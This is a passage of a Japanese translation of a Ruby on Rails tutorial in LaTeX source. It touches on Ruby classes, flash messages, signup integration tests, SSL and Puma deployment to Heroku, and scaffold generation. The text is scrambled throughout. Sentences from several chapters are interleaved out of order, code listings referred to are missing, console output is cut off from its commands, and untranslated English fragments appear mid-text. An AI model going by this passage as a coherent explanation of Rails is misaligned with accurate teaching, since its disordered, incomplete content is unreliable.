ここで重要な点があります。Railsのアクションには戻り値がありません。少なくとも、返される値は重要ではありません。
ユーザー登録に成功した場合は、ページを描画するのではなく別のページに\emph{リダイレクト}するようにしてみましょう。
第\ref{cha:static_pages}章で示したとおり、\kode{home} アクションはWebページを表示するためのものであり、値を返すためのものではありませんでした。
しかも、第3章では一度も\kode{StaticPagesController.new}を実行しませんでした。
ルートURLにリダイレクトしてもよいですが、一般的な慣習にしたがって、新しく作成されたユーザーのプロフィールページにリダイレクトしてみます。
どうしてこれでうまくいっているのでしょうか。
実は、Railsは確かにRubyで\emph{書かれて}いますが、既にRubyとは別物なのです。
実際のアプリケーションコードをリスト\ref{code:user_create_action}に示します (\kode{redirect\_to} メソッドに注目してください)。
Railsのクラスは、普通のRubyオブジェクトと同様に振る舞うものもありますが、多くのクラスにはRailsの\href{http://www.answers.com/grist}{魔法の粉}が振りかけられています。
保存とリダイレクトを行う、userの\kode{create}アクション
Railsは\href{http://en.wikipedia.org/wiki/Sui_generis}{\emph{独特}}であり、 Rubyとは切り離して学習する必要があります。
最後に完全なクラスを作成して、この章を終わりにしましょう。そこで、第\ref{cha:modeling_users}章で使用する \kode{User} クラスを最初から作成することにします。
これまではコンソール上でクラスを定義しましたが、このような面倒な作業はもう行いたくありません。これからは、アプリケーションのルートディレクトリに\kode{example\_user.rb}ファイルを作成し、そこにリスト\ref{code:example_user}のように書くことにします。
 example\_userで使用するコード
ここで
といった行がありますが、これは次のコードと等価になります。
上のコードはこれまでよりもやや複雑になっていますので、順に見ていくことにします。
以下の最初の行は、
これはRailsが、\kode{redirect\_to @user}というコードから\kode{user\_url(@user)}といったコードを実行したいことを(自動的に)推察してくれた結果になります。
ユーザー名とメールアドレスに対応する\emph{アトリビュートアクセサ}をそれぞれ作成します。
リスト\ref{code:user_create_action}のコードによって、ユーザー登録フォームが実際に動くようになりました。これでブラウザから正しいユーザー情報を登録できるようになりましたが、その前にWebアプリケーションに常識的に備わっている機能を追加してみましょう。登録完了後に表示されるページにメッセージを表示し (この場合は新規ユーザーへのウェルカムメッセージ)、2度目以降にはそのページにメッセージを表示しないようにするというものです。
このコードは、\ref{sec:mvc_in_action}や\ref{sec:mvc_in_action}でも説明したように、\kode{@name}および\kode{@email} \emph{インスタンス変数}について、取り出し(get) と割り当て(set) を行う "ゲッター" と "セッター" というメソッドをそれぞれ作成します。
Railsでこういった情報を表示するためには、\emph{flash}という特殊な変数を使います。この変数はハッシュのように扱います。
Railsでは、インスタンス変数を作成するだけでビューで自動的に使えるようになるという点に主な利用価値がありますが、一般的には、インスタンス変数はRubyのそのクラス内のどこでも利用できるようにしたい変数として使われます
Railsの一般的な慣習に倣って、\kode{:success}というキーには成功時のメッセージを代入するようにします (リスト\ref{code:signup_flash})。
(これについては後で詳しく説明します)。
ユーザー登録ページにフラッシュメッセージを追加する
インスタンス変数は常に\kode{@}記号で始まり、未定義の状態では値が\kode{nil}になります。
最初の行にある\kode{initialize}は、Rubyの特殊なメソッドです。これは \kode{User.new}を実行すると自動的に呼び出されるメソッドです。
この場合の\kode{initialize}メソッドは、以下のように\kode{attributes}という引数を1つ取ります。
\kode{flash}変数に代入したメッセージは、リダイレクトした直後のページで表示できるようになります。
今回は\kode{flash}内に存在するキーがあるかを調べ、もしあればその値 (メッセージ) を全て表示するように、レイアウトを修正します。
\ref{sec:hashes_and_symbols}でコンソール上で実行した例を思い出してみてください。そこではあえて\kode{flash}と名付けたハッシュを使用してハッシュの値を列挙しました。
最後に、\kode{formatted\_email}メソッドを定義しましょう (\ref{sec:strings})。このメソッドは、文字列の式展開を利用して、\kode{@name}と\kode{@email}に割り当てられた値をユーザーのメールアドレスとして構成します。
"It worked!"
\kode{@} 記号によって示されているとおり、\kode{@name}と\kode{@email}は両方ともインスタンス変数なので、自動的に\kode{formatted\_email}メソッドで使えるようになります。
It failed.
Railsコンソールを起動し、example\_userのコードを\kode{require}して、自作したクラスを試しに使ってみましょう。
success
=> #<User:0x224ceec @email=nil, @name=nil>
It worked!
=> "Example User"
上で示したパターンに則って、flash変数の内容をWebサイト全体にわたって表示できるようにすると、次のようなコードになります。
なお、このコードではHTMLとERbが雑に混ざっています。これをキレイに整形する課題は演習として残しておきます (\ref{sec:signup_exercises})。
=> "user@example.com"
さて、次の埋め込みRubyでは
=> "Example User <user@example.com>"
(\kode{:success}キーはシンボルですが、テンプレート内に反映させる直前で、埋め込みRubyが自動的に\kode{"success"}という文字列に変換しています。)
上のコードで、requireのパスにある\kode{’.’}は、Unixの “カレントディレクトリ” (現在のディレクトリ) を表し、\kode{’./example\_user’}というパスは、カレントディレクトリからの相対パスでexample\_userファイルを探すようにRubyに指示します。
次のコードでは空のexample\_userを作成します。次に、対応する属性にそれぞれ手動で値を代入することで、名前とメールアドレスを与えます (リスト\ref{code:example_user}で\kode{attr\_accessor}を使用しているので、アトリビュートアクセサを使用して代入できます)。
以下のコードは、
\kode{@name}変数に\kode{"Example User"}という値を設定します。同様に\kode{email}属性にも値を設定します。これらの値は\kode{formatted\_email}メソッドで使用されます。
\ref{sec:css_revisited}では、最後のハッシュ引数の波かっこを省略できることを説明しました。それと同じ要領で\kode{initialize}メソッドにハッシュを渡すことで、属性が定義済みの他のユーザを作成することができます。
=> #<User:0x225167c @email="mhartl@example.com",<n>@name="Michael Hartl">
これにより、キーの内容によって異なったCSSクラスを適用させることができ、メッセージの種類によってスタイルを動的に変更させることができます。
たとえば、\ref{sec:rendering_with_a_flash_message}では\kode{flash[:error]}を使用してログインに失敗したことを表すメッセージを表示します
=> "Michael Hartl <mhartl@example.com>"
実際には、これに非常に近い\kode{flash.now}を使いますが、本当に必要になるまでは使わないようにしようかと思います。
第\ref{cha:sign_up}章 では、 ハッシュ引数を使用してオブジェクトを初期化します。これは一般に\emph{マスアサインメント (mass assignment)} と呼ばれる技法で、Railsアプリケーションで多用されています。
(実際、既に\kode{alert-danger}というCSSクラスを使って、リスト\ref{code:errors_partial}のエラーメッセージのスタイルをdivタグで指定しています。)
以上で、Ruby言語の概要の説明を終わります。
Bootstrap CSSは、このようなflashのクラス用に4つのスタイルを持っています (\kode{success}、\kode{info}、\kode{warning}、\kode{danger})。また、本書のサンプルアプリケーションでは、これらの全てのスタイルを場合に応じて使っていきます。
第\ref{cha:filling_in_the_layout}章では、この章で学んだ内容をサンプルアプリケーションの開発に活かしていきます。
テンプレート内にflashのメッセージが差し込まれるので、次のようなコードは、
\ref{sec:a_user_class}で作成した\kode{example\_user.rb}ファイルは今後使用することはありませんので、削除してください。
最終的には次のようなHTMLはになります。
その他の変更はリポジトリにコミットしましょう。その後、Bitbucketにプッシュし、Herokuにデプロイしましょう。
先ほど説明した埋め込みRubyをレイアウトに埋め込んだ結果を、リスト\ref{code:layout_flash}に示します。
\kode{flash}変数の内容をWebサイトのレイアウトに追加する
Rubyは文字列を扱うためのメソッドを多数持っている
Rubyの世界では、すべてがオブジェクトである
Rubyでは\kode{def}というキーワードを使ってメソッドを定義する
Rubyでは\kode{class}というキーワードを使ってクラスを定義する
Railsのビューでは、静的HTMLの他にERB (埋め込みRuby: Embedded RuBy) も使用できる。
Rubyの組み込みクラスには配列、範囲、ハッシュなどがある
Rubyのブロックは (他の似た機能と比べ) 柔軟な機能で、添え字を使ったデータ構造よりも自然にイテレーションができる
シンボルとはラベルである。追加的な構造を持たない (代入などができない) 文字列みたいなもの。
ついにユーザー登録が完成しました。名前を “Rails Tutorial”、メールアドレスを “example@railstutorial.org”として登録してみましょう (図\ref{fig:first_signup})。
Rubyではオブジェクトを継承できる
登録結果 (図\ref{fig:signup_flash})にはユーザー登録成功を示すウェルカムメッセージが、\kode{success}クラスのさわやかな緑色の背景で表示されています。このクラスは\ref{sec:custom_css}のBootstrap CSSフレームワークのものです。
Rubyでは組み込みクラスですら内部を見たり修正したりできる
もしメールアドレスが既に使用されているというメッセージが表示されたら、\ref{sec:signup_form}でやったようにRakeの\kode{db:migrate:reset} 実行してデータベースをリセットしてください。
ユーザー表示ページを再度読み込むと、今度はフラッシュメッセージは表示されなくなりました (図\ref{fig:signup_flash_reloaded})。
「“deified”」という単語は回文である
ユーザー登録に必要な情報を入力する
ユーザー登録が成功し、フラッシュメッセージが表示される
ブラウザでページを再読み込みすると、フラッシュメッセージが表示されなくなる
今度はデータベースを覗いて、新規ユーザーが確かに登録されていることをダブルチェックしましょう。
次に進む前に、ここで一旦、有効な送信に対するテストを書いてみます。これによって、アプリケーションの振る舞いを検証し、もし今後バグが埋め込またらそれを検知できるようになります。
\ref{sec:a_test_for_invalid_submission}で書いた無効な送信に対するテストと同様に、今回の目的はデータベースの中身が正しいかどうか検証することです。
すなわち、有効な情報を送信して、ユーザーが\emph{作成された}ことを確認します。
リスト\ref{code:a_test_for_invalid_submission}のときと同じは、次のようにテストを書きましたが
リスト\ref{code:string_shuffle}のコードにある２つの疑問符を、それぞれ適切なメソッドに置き換えて、与えられた文字列の文字をシャッフルする関数を作成してください。ヒント: \kode{split}メソッド、\kode{shuffle}メソッド、\kode{join}メソッドを組み合わせてみましょう。
今回は\kode{assert\_difference}というメソッドを使ってテストを書きます。
Using Listing \ref{code:string_shuffle_two} as a guide, add a \kode{shuffle} method to the \kode{String} class.
\kode{person1}、\kode{person2}、\kode{person3}という3つのハッシュを作成してください。それぞれのハッシュには\kode{:first}キーと\kode{:last}キーを与え、さらにそれぞれのキーに名前と名字を値として割り当ててください。
第二引数はオプションですが、ここには比較した結果の�差異 (今回の場合は1) を渡します。
リスト\ref{code:a_test_for_invalid_submission}と同じファイルに\kode{assert\_difference}を使ったテストを追加すると、リスト\ref{code:a_test_for_valid_submission}のようになります。
最後に、\kode{params[:father][:first]}などが正しい値を持っていることを確認してください。
ここで、users\_pathにPOSTリクエストを送信するために、\kode{post\_via\_redirect}というメソッドを使っていることに注目してください。
Ruby API のオンラインマニュアルを見つけて、Hashクラスの\kode{merge}メソッドについて読んでみてください。
このメソッドは、POSTリクエストを送信した結果を見て、指定されたリダイレクト先に移動するメソッドです。したがって、この行の直後では\kode{’users/show’}テンプレートが表示されているはずです。
では、次の式の値は何ですか？
ちなみに、ここにflashのテストも追加しておくとよいでしょう。これは演習として残しておきます (\ref{sec:signup_exercises})。
文字列をシャッフルする関数の骨組み。
有効なユーザー登録に対するテスト
\kode{shuffle}メソッドを\kode{String}クラスに追加するための骨組み。
リスト\ref{code:a_test_for_valid_submission}では、ユーザー登録に成功させた後に、どのテンプレートが表示されているのか検証していることにも注目してください。
最後に、
上のコードでは、ユーザープロフィールに関するほぼ全て (たとえばページにアクセスしたらなんらかの理由でエラーが発生しないかどうかなど) をテストできていることに注目してください。
この類のエンドツーエンドテストは、アプリケーションの重要な機能をカバーしてくれています。こういった理由が統合テストが便利だと呼ばれる所以です。
ユーザー登録ページを動かすことができたので、このアプリケーションをデプロイして、本番環境でも動かせるようにしてみましょう。
第\ref{cha:static_pages}章からデプロイをして来ましたが、実際にデータを\emph{操作できるようにする}デプロイは初めてです。そこで、この機会にプロレベルのデプロイ方法について説明していきます。
具体的には、ユーザー登録をセキュアにするために、本番用のアプリケーションに重要な機能を追加していきます。その後、デフォルトのWebサーバを実際の世界で使われているWebサーバに置き換えていきます。
デプロイの下準備として、まずはこの時点までの変更を\kode{master}ブランチにマージしておいてください。
<n>\end{code}<n><n>  \subsection{本番環境でのSSL} % (fold)<n>  \label{sec:ssl_in_production}<n><n>
本章で開発したユーザー登録フォームで送信すると、名前やメールアドレス、パスワードといったデータがネットワーク越しに流されていきます。実は、このようなネットワークに流れるデータは途中で捕捉できるため、扱いには注意が必要です。
技術上は、SSLはTLS (Transport Layer Security) と名称が変わりましたが、未だに “SSL” と呼ばれ続けています。
今回はユーザー登録ページのためだけにSSLを導入しますが、これはWebサイト全体で適用できるため、第\ref{cha:log_in_log_out}章で実装するログイン機構をセキュアにしたり、\ref{sec:remember_me}で説明する\emph{セッションハイジャック}の脆弱性に対しても多くの利点を生み出します。
具体的には、  \kode{config}変数で「本番環境ではSSLを強制する」という設定をするだけです (リスト\ref{code:ssl_in_production})。
本番環境ではSSLを使うように修正する
# Force all access to the app over SSL, use Strict-Transport-Security,
# and use secure cookies.
次に、遠隔にあるサーバーのSSLをセットアップします。
本番用のWebサイトでSSLを使えるようにするためには、ドメイン毎に\emph{SSL証明書}を購入し、セットアップする必要があります。
これには多くの作業が必要となりますが、幸運にもそういった作業をしなくても済む方法があります。それは、Heroku上でサンプルアプリケーションを動かし、HerokuのSSL証明書に便乗する方法です (訳注: ただし、この方法はHerokuのサブドメインでのみ有効です。独自ドメインを使う場合はSSL証明書を購入する必要があります)。
結果として、\ref{sec:production_webserver}でアプリケーションのデプロイが終わると、自動的にSSLが有効化されているはずです。, SSL will automatically be enabled.
(もし\kode{www.example.com}などの独自ドメインでSSLを使いたい場合は、\href{http://devcenter.heroku.com/articles/ssl}{Heroku’s page on SSL} (英語) の記事を参照してください。)
<n><n>  % subsection ssl_in_production (end)<n><n>  \subsection{本番環境用Webサーバー} % (fold)<n>  \label{sec:production_webserver}<n><n>
SSLを導入したので、次はアプリケーションの設定をいじって、本番環境に適したWebサーバを使ってみましょう。
Herokuのデフォルトでは、Rubyだけで実装されたWEBrickというWebサーバを使っています。WEBrickは簡単にセットアップできたり動せることが特長ですが、著しいトラフィックを扱うことには適していません。
つまり、WEBrickは\href{https://devcenter.heroku.com/articles/ruby-default-web-server}{本番環境として適切なWebサーバではありません}。よって、今回は\href{https://devcenter.heroku.com/articles/deploying-rails-applications-with-the-puma-web-server}{WEBrickをPumaというWebサーバに置き換えてみます}。Pumaは多数のリクエストを捌くことに適したWebサーバです。
新しいWebサーバを追加するために、\href{https://devcenter.heroku.com/articles/deploying-rails-applications-with-the-puma-web-server}{Heroku内のPumaドキュメント} (英語) にしたがってセットアップしていきます。
selfを省略した結果をリスト\ref{code:puma_gemfile}に示します。
このとき、ローカル環境 (開発用の環境) でPumaを使う必要はないので、リスト\ref{code:puma_gemfile}のように\kode{:production}グループの中に追加しておきます。
\kode{Gemfile}にPumaを追加する
Bundlerでは本番環境用のgemはインストールしない設定にしておいたので (\ref{sec:sample_app_setup})、リスト\ref{code:puma_gemfile}は開発環境に影響はありません。しかし、Bundlerに\kode{Gemfile.lock}を更新してもらう必要があるので、いつものように次のコマンドを実行しておきます。
次のステップは、\kode{config/puma.rb}というファイルを作成し、そこにリスト\ref{code:production_webserver_config}のような設定情報を追加します。
リスト\ref{code:production_webserver_config}では少しだけコードの見栄えを修正しています。これは標準的な1行80文字の制限に合わせるための変更です。
本番環境のWebサーバー設定ファイル
最後に、\kode{Procfile}と呼ばれる、Heroku上でPumaのプロセスを走らせる設定ファイルを作成します (リスト\ref{code:procfile})。
Pumaが使うように\kode{Procfile}で定義する
これで、本番環境用のWebサーバの設定は完了しました。これらの変更をコミットし、デプロイしてみましょう
本章ではデータモデルに対して変更を加えていなかったので、\ref{sec:modeling_users_conclusion}のステップが済んでいれば、本当はHeroku上でマイグレーションを実行しなくても問題ないはずです。
ただし、読者からトラブル報告がいくつか来ていたので、念のため\kode{heroku run rake db:migrate}を実行するようにしてあります。
ユーザー登録フォームが無事に動いたら成功です。成功すると図\ref{fig:signup_in_production}のようになります。
このとき、URLが\texttt{https://}に変わっていて、アドレスバーに鍵アイコンが表示されていることにも注目してください (図\ref{fig:signup_in_production})。これは先ほど設定したSSLがうまく動いていることを示しています。
本番環境 (Web上) で実際にユーザー登録をしてみる
ところで、Herokuのデプロイするとき、もしかしたら次のような警告メッセージを目にしたことがあるかもしれません。
(これは「Rubyのバージョンを明示的に指定してください」というメッセージですが) 経験的には、本書のようなチュートリアルの段階では明示的に指定しない方がスムーズに進むことが多いので、この警告は現時点では無視してしまった方がよいでしょう。
たとえば、 ローカルマシンでRuby 2.1.4がインストールできなくて何時間も過ごしてしまい、なんとか無事にインストールできたと思ったら、先日Ruby 2.1.5がリリースされたことに気付いたときなどです。
ちなみにRuby 2.1.5のインストールにも苦戦しました。
ユーザー登録機能の実装は、私たちのサンプルアプリケーションにとって大きなマイルストーンでした。
この時点でサンプルアプリケーションはかなり実用的になってきましたが、まだ重要な機能がいくつも残っています。
第\ref{cha:log_in_log_out}章では、認証 (authentication) システムを導入し、ユーザーがログインとログアウトをできるようにします。
第\ref{cha:updating_showing_and_deleting_users}章では、どのユーザーも自分のアカウント情報を更新できるようにし、Webサイトの管理者がユーザーを削除できるようにします。それにより、Usersリソースに表\ref{table:RESTful_users}のRESTアクションがすべて実装されるようにします。
<n><n>\subsection{本章のまとめ} % (fold)<n>\label{sec:sign_up_what_we_learned_in_this_chapter}<n><n>\begin{itemize}<n><n>\item 
\kode{debug}メソッドを使うことで、役立つデバッグ情報を表示できる
Sassのmixin機能を使うと、CSSのルールをまとめたり他の場所で再利用できるようなる
Railsには標準で3つ環境が備わっており、それぞれ\kode{開発環境 (development)}、\kode{テスト環境 (test)}、\kode{本番環境 (production)}と呼ぶ
標準的なRESTfulなURLを通して、ユーザー情報を\emph{リソース}として扱えるようになった
Gravatarを使うと、ユーザーのプロフィール画像を簡単に表示できるようになる
\kode{form\_for}ヘルパーは、Active Recordのオブジェクトに対応したフォームを生成する
ユーザー登録に失敗した場合はnewビューを再描画するようにした。その際、Active Recordが自動的に検知したエラーメッセージを表示できるようにした
\kode{flash}変数を使うと、一時的なメッセージを表示できるようになる
ユーザー登録に成功すると、データベース上にユーザーが追加、プロフィールページにリダイレクト、ウェルカムメッセージの表示といった順で処理が進む
統合テストを使うことで送信フォームの振る舞いを検証したり、バグの発生を検知したりできる
セキュアな通信と高いパフォーマンスを確保するために、本番環境ではSSLとPumaを導入した
リスト\ref{code:gravatar_option}のコードを使用して、\ref{sec:a_gravatar_image}で定義された\kode{gravatar\_for}ヘルパーにオプションの \kode{size}パラメーターを取ることができる (\kode{gravatar\_for user, size: 50}のようなコードをビューで使用できる) ことを確認してください。
(\ref{sec:users_index}でこれを改善したヘルパーを使います)
リスト\ref{code:f_error_messages}で実装したエラーメッセージに対するテストを書いてみてください。
どのくらい細かくテストするかはお任せします。リスト\ref{code:error_messages_test}にテンプレートを用意しておいたので、参考にしてください。
\ref{sec:the_flash}で実装したflashに対するテストを書いてみてください。
どのくらい細かくテストするかはお任せします。 リスト\ref{code:flash_test}に最小限のテンプレートを用意しておいたので、参考にしてください (ヒント:  \kode{FILL\_IN}メソッドを適切なコードに置き換えると完成します)。
(テキストに対するテストは壊れやすいです。文量の少ないflashのキーであっても、それは同じです。個人的には、flashが空でないかをテストするだけの場合が多いです)
\ref{sec:the_flash}で触れたように、flash用のHTML (リスト\ref{code:layout_flash}) は読みにくいです。
より読みやすくしたリスト\ref{code:layout_flash_content_tag}のコードに対してテストスイートを実行し、こちらも正常に動作することを確認してください。このコードでは、Railsの\kode{content\_tag}ヘルパーを使用しています。
\kode{gravatar\_for}ヘルパーにキーワード引数を追加する
エラーメッセージをテストするためのテンプレート
flashをテストするためのテンプレート
\kode{content\_tag}を使ってレイアウトの中に\kode{flash}を埋め込む
この章では、Railsの強力な機能をいくつか紹介するためのおもちゃアプリケーションを作成します。
大量の機能を自動的に生成する\emph{scaffold}ジェネレータというスクリプトを使ってアプリケーションをすばやく生成し、それを元に高度なRailsプログラミングとWebプログラミングの概要を学びます。
生成されたToyアプリケーションはブラウザのアドレスバーにURLを入力すれば動かせます。これを使用して、Railsアプリの構造とRailsで推奨されている\emph{RESTアーキテクチャ}について考察することにします。
Toyアプリケーションは、後に作成するサンプルアプリケーションと同様、\emph{ユーザー}と、それに関連している\emph{マイクロポスト}から成り立っています。
このToyアプリケーションはもちろん動きますが完成品ではなく、しかも多くの手順が「魔法」のように思えるかもしれません。第\ref{cha:static_pages}章以降で作成するサンプルアプリケーションでは同等の機能を1つ1つ手動で作成しますので、ご安心ください。
その分時間がかかることになりますが、どうか最後まで本書にお付き合いいただければと思います。本書の目的は、scaffoldを使用した即席のアプローチによる表面的な理解ではなく、そこを\emph{突破して}Railsを深いレベルまで理解することにあります。
<n><n>\section{アプリケーションの計画} % (fold)<n>\label{sec:planning_the_application}<n><n>
はじめに、Toyアプリケーションをどのようなものにするのか、計画を立てましょう。
\ref{sec:the_hello_application}で説明したように、\kode{rails new}コマンドでRailsのバージョン番号を指定して、アプリケーションの骨組みを生成するところから始めましょう。
上のコマンドを実行すると「Could not find ’railties'」というエラーが表示される場合は、インストールしたRailsのバージョンが正しくない可能性があります。リスト\ref{code:installing_rails}のとおりにコマンドを実行したかどうかを念のためダブルチェックしてください。
(\ref{sec:development_environment}で推奨されているクラウドIDEをご利用の場合は、この2つ目のアプリは1つ目のアプリと同じワークスペースに作成されるという点に注意する必要があります。
2つ目のアプリのために別のワークスペースを作成する必要はありません。
ファイルが表示されるようにするには、ファイルナビゲーターの歯車アイコンをクリックして [Refresh File Tree] をクリックします。)
Toyアプリケーション用の\kode{Gemfile}
リスト\ref{code:demo_gemfile_sqlite_version_redux}の内容はリスト\ref{code:gemfile_pg_gem}と同じです。
最後に、GitでこのToyアプリケーションをバージョン管理下に置きます。
次に、Bitbucketで [Create] ボタンをクリックして\href{https://bitbucket.org/repo/create}{新しいリポジトリを作成}します(図 \ref{fig:create_demo_repository})。続いて、生成したファイルをこの新しいリモートリポジトリにプッシュします。
Bitbucketにtoyアプリのリポジトリを作成する
このコードはリスト\ref{code:hello_action}で使用されていました。もうひとつ、
主な理由は、デフォルトのRailsページはHerokuで破損してしまうことが多く、そのままだとデプロイが成功したのか失敗したのかがわかりにくいためです。
続いてこの変更をコミットし、Herokuにプッシュします。
(\ref{sec:deploying}のときと同じように警告メッセージが表示されることがありますが、無視して構いません。
この警告は\ref{sec:professional_grade_deployment}で解決する予定です)。
これで、Herokuアプリのアドレス以外は図\ref{fig:heroku_app}のとおりに表示されるはずです。
これで、アプリケーション自体を作成するための下準備が整いました。
Webアプリケーションを作る際、アプリケーションで使用される構造を表すための\emph{データモデル}を最初に作成しておくのが普通です。
今回のToyアプリケーションでは、ユーザーと短いマイクロポストのみをサポートするマイクロブログを作成します。
Thus, we’ll begin with a model for \emph{users} of the app (Section \ref{sec:modeling_demo_users}), and then we’ll add a model for \emph{microposts} (Section \ref{sec:modeling_demo_microposts}).
<n><n>    \subsection{ユーザーのモデル設計} % (fold)<n>    \label{sec:modeling_demo_users}<n><n>
Webでのユーザー登録の方法が多岐にわたることからもわかるように、ユーザーという概念をデータモデルで表す方法はたくさんありますが、ここではあえて最小限の表現方法を使用します。
各ユーザーには、重複のない一意のキーとなる\kode{integer}型のID番号 (\kode{id}と呼びます) を割り当て、このIDに加えて一般公開される\kode{string}型の名前 (\kode{name})、そして同じく\kode{string}型のメールアドレス (\kode{email}) を持たせます。メールアドレスはユーザー名としても使われます。
A summary of the data model for users appears in Figure \ref{fig:demo_user_model}.
ユーザーのデータモデル
詳しくは\ref{sec:database_migrations}から解説しますが、図2.2\ref{fig:demo_user_model}のユーザー (\kode{users} ) はデータベースのテーブル (\emph{table}) に相当します。また、 \kode{id}、\kode{name}、 \kode{email} の属性はそれぞれテーブルのカラム (\emph{column}: 列) に相当します。
<n><n>    % subsection modeling_users (end)<n><n>    \subsection{マイクロポストのモデル設計} % (fold)<n>    \label{sec:modeling_demo_microposts}<n><n>
マイクロポストのデータモデルはユーザーよりもさらにシンプルです。\kode{id}とマイクロポストのテキスト内容を格納する\kode{string}型の\kode{content}だけで構成されています
マイクロポストはその名のとおり短いのですが、\kode{string}型の上限がかなり大きいのでそこに保存するとかなり余ってしまいます。\kode{text}型ならもっと手頃で、かつ最大長を必要に応じて大きくすることもできます。
しかし実際には、マイクロポストをユーザーと\emph{関連付ける (associate)} 必要があります。そのため、マイクロポストの投稿者を記録するための\kode{user\_id}も追加します。
The results are shown in Figure \ref{fig:demo_micropost_model}.
マイクロポストのデータモデル
\ref{sec:demo_user_has_many_microposts}では、\kode{user\_id}という属性を使用して、1人のユーザーに複数のマイクロポストが関連付けられるという構造を簡潔に説明します。詳細は\kode{第\ref{cha:user\_microposts}章}で完全に説明します。
<n><n>    % subsection modeling_microposts (end)<n><n>% section planning_the_application (end)<n><n>  \section{Usersリソース} % (fold)<n>  \label{sec:demo_users_resource}<n><n>
ここでは、\ref{sec:modeling_demo_users}で説明したユーザー用のデータモデルを、そのモデルを表示するためのWebインターフェイスに従って実装します。
このデータモデルとWebインターフェイスは、組み合わさって\emph{Usersリソース}となり、ユーザーというものを、\href{http://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol}{HTTPプロトコル}経由で自由に作成/読み出し/更新/削除できるオブジェクトとみなすことができるようになります。
「はじめに」で約束したとおり、このUsersリソースはすべてのRailsプロジェクトに標準装備されているscaffoldジェネレータで生成します。
scaffoldで生成された膨大なコードを今詳細に読む必要はありません。今の段階ではおそらく混乱するだけでしょう。
Railsのscaffoldは、\kode{rails generate}スクリプトに\kode{scaffold}コマンドを渡すことで生成されます。
\kode{scaffold}コマンドの引数には、リソース名を単数形にしたもの (この場合は\kode{User}) を使用し、必要に応じてデータモデルの属性をオプションとしてパラメータに追加します
scaffoldで指定する名前は、\emph{モデル}名の命名の習慣に従って「単数形」にします。リソースやコントローラは「複数形」で表し、モデルは「単数形」で表します。
従って、Scaffoldでは (\kode{Users}ではなく) \kode{User}と指定します。
$ rails generate scaffold User name:string email:string
      invoke  resource_route
       route  resources :users
      invoke  scaffold_controller
      create    app/controllers/users_controller.rb
      invoke    erb
      create      app/views/users
      create      app/views/users/index.html.erb
      create      app/views/users/edit.html.erb
      create      app/views/users/show.html.erb
      create      app/views/users/new.html.erb
      create      app/views/users/_form.html.erb
      create      test/controllers/users_controller_test.rb
      invoke    helper
<n>      create      app/helpers/users_helper.rb
      invoke      test_unit
      create        test/helpers/users_helper_test.rb
      invoke    jbuilder
      create      app/views/users/index.json.jbuilder
      create      app/views/users/show.json.jbuilder
      invoke  scss
本章から、本格的なサンプルアプリケーションの開発を進めていきます。残りのチュートリアルでは、このアプリケーションを例題として扱って学習していくことになります。
      create    app/assets/stylesheets/scaffolds.css.scss
本書を通して開発するアプリケーションは、最終的にはユーザーやマイクロポスト、ログイン/ログアウトなどの認証機能を持ちますが、まずは簡単なトピックである「静的なページの作成」から始めます。
\kode{name:string}と\kode{email:string}オプションを追加することで、Userモデルの内容が図\ref{fig:demo_user_model}の表のとおりになるようにします
(なお、\kode{id}パラメータはRailsによって自動的に\emph{主キー}としてデータベースに追加されるため、追加不要です)。
非常に単純なページではありますが、静的なページを自分の手で作成することは良い経験になり、多くの示唆も得られます。私達がこれから開発するアプリケーションにとって最適なスタート地点といえるでしょう。
Rails はデータベースと連携して動的なWebサイトを開発するように設計されていますが、HTMLファイルだけで構成されている静的なページを作ることもできます。
==  CreateUsers: migrating =================================
実際、Railsであえて静的なページを使用しておいて、後から\emph{ほんの少し}動的なコンテンツを追加することもできます。
-- create_table(:users)
本章では、このような静的なページの作成について学んでいきます。
   -> 0.0017s
本章ではそれと平行して、近年のプログラミングで不可欠となっている「\emph{自動化テスト}」の雰囲気を掴んでいただきます。自動化テストを作成することで、コードが正しく動いていることが裏付けられます。
==  CreateUsers: migrated (0.0018s) ========================
さらに、良いテストを書くことで、自信をもって\emph{リファクタリング}を行うことができます。たとえば、フォームの振る舞いを変更せずに、フォーム内で使われている関数を書き換えたいときに有用です。
<n><n>\section{セットアップ} % (fold)<n>\label{sec:sample_app_setup}<n><n>As in Chapter~\ref{cha:a_toy_app}, before getting started we need to 
このコマンドは、単にデータベースを更新し、\kode{users}データモデルを作成するためのものです
(データベースのマイグレーションの詳細については\ref{sec:database_migrations}以降で説明します)。
selfを省略した結果をリスト\ref{code:rails_new_sample_app}に示します。
(クラウド IDE など多くのシステムでは、\kode{bundle exec}なしでも rake を実行できますが、bundle execが必要なシステムもあるので、本書では念のため使用するようにしています)。
クラウドIDEをお使いの場合は「Goto Anything」コマンド (ファイル名の一部を入力するだけでその場所にジャンプする) が重宝します。
ここまでの手順が完了すると、以下のコマンドでローカルWebサーバーを別タブで実行できるようになります (図\ref{fig:rails_server_new_tab})
「hello」アプリ「toy」アプリ「sample」アプリには同じファイル名が多数あるため、これらのアプリを同じプロジェクトに置くとファイルを見つけにくくなることがあります。
\kode{rails}スクリプトは、\kode{bundle exec}なしで動作する設計になっています。
そこで、この先に進む前に先の2つのアプリを思い切って削除しておくとよいでしょう。アプリを削除するには、\kode{workspace}ディレクトリに移動して\kode{rm -rf hello\_app/ toy\_app/}コマンドを実行します(表\ref{table:unix_commands})。
これで、\ref{sec:rails_server}で説明したとおりにローカルサーバーが動作するはずです
これらのアプリを既にBitbucketのリポジトリにプッシュしてあるなら、それを利用していつでもアプリを復元できます (その必要があればですが)。
(クラウド IDE で作業している方は、IDE自体ではなく、必ず\emph{ブラウザ}の別タブを使用してこのdevelopmentサーバーを開いてください)。
Unixでは、ソースコードから実行用プログラムをビルドするために主に\href{http://en.wikipedia.org/wiki/Make_(software)}{\emph{make}}というツールが使われてきました。多くのプログラマーが、肉体レベルにまで刻み込まれた以下のようなコマンドを実行して
サンプルアプリケーションを生成する \passing
  $ ./configure && make && sudo make install
(\ref{sec:planning_the_application}でも説明したとおり、クラウドIDEをご利用の方は、このプロジェクトをこれまでの2つの章で作成したプロジェクトと同じワークスペースに置くことができます。
LinuxやMac OS Xなどで日夜コードをコンパイルしています。
このプロジェクトで特に新しいワークスペースを作成する必要はありません)。
Rakeはいわば\emph{Ruby版のmake}であり、Rubyで記述することのできる、makeのような言語です。
Railsでは、Rakeを頻繁に使用しています。特に、データベースを背後に持つWebアプリケーション開発時に必要となる管理タスクで顕著です。
